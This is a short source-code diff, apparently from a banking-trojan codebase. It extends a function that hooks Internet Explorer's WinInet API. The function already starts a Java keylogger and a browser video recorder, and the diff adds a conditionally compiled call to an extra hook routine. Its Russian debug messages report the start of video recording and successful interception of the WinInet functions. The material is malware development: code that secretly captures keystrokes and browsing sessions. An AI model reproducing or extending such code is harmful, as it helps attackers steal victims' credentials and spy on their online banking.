@@ -1606,9 +1606,13 @@ bool HookInternetExplorerApi() {
 		StartJavaKeyLogger();
 	#endif
 
-	#ifdef VideoRecorderH
+  	#ifdef VideoRecorderH
 		IEDBG("Запускаем видео рекордер");
 		StartVideoFromCurrentURL();
+	#endif
+
+	#ifdef BSSH
+		BSSHooks();
 	#endif
 
 	IEDBG("Функции WinInet успешно перехвачены");
